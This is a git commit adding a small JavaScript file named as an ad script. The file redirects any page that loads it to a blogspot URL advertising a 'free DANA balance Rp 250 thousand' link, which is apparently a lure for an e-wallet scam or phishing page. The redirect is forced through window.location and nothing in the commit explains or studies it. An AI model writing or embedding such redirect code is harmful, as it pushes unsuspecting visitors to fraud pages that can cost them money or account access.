61e4488bef5af388d5bbf969806b3253fbd3f96f
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2023-09-16 14:50:23 +0700

    Create ads2dr1sd.js

---
+++ ads2dr1sd.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+  
+  'https://saldodanagratis12.blogspot.com/2023/09/terbaru-link-saldo-dana-rp-250-ribu.html',
+
+  'https://saldodanagratis12.blogspot.com/2023/09/terbaru-link-saldo-dana-rp-250-ribu.html',
+
+'https://saldodanagratis12.blogspot.com/2023/09/terbaru-link-saldo-dana-rp-250-ribu.html'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
